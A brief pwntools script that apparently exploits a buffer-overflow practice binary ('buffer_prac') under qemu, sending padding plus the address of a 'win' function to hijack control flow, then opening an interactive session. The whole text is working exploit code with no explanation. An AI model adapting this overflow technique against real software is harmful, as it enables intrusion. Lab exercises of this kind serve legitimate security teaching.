from pwn import *

elf = ELF("./buffer_prac")
pty = process.PTY
p = process(["qemu-x86_64", "./buffer_prac"], stdin=pty, stdout=pty)

p.sendlineafter(b"?\n", b"5")
p.sendlineafter(b"y\\n \n", b"0" * 22 + p64(elf.symbols["win"]))

p.interactive()